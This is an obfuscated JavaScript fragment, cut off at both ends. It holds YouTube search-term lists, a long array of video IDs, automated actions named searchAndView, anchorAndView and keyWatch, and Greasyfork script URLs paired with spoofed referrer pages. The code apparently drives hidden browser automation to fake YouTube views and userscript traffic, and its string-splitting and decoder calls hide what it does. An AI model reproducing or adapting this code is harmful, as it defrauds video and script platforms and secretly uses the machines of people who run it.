'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms[a1(0x4)](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + a1(0x10) + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x26d5 + 0xe2b + 0x1a7b * -0x2)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x64 * 0x5 + -0x1 * 0xc9 + 0x2c7 * 0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xa * -0x23 + -0x8 * 0x282 + -0x1571 * -0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    a2(0x12, '$C17') + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    a1(0x13) + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    a1(0x14) + '8',
    'Y4NLDaowD6' + 'I',
    a3(0xe) + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    a2(0x11, '3U![') + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a3(0x9) + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': a1(0x16) + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
